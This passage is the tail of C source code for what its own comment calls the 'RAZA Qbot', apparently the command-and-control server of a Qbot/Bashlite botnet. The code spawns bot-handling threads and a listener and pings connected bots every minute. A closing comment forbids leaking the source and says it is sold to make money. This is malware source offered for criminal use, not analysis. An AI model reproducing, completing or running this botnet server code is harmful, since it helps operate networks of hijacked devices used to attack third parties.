        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}

/* RAZA Qbot Made was made by Edo Changing or ripping from this code is strickly forbiden
and don't be a retard and leak my source I don't mind people selling it lets just keep it private because
were all here to make monney*/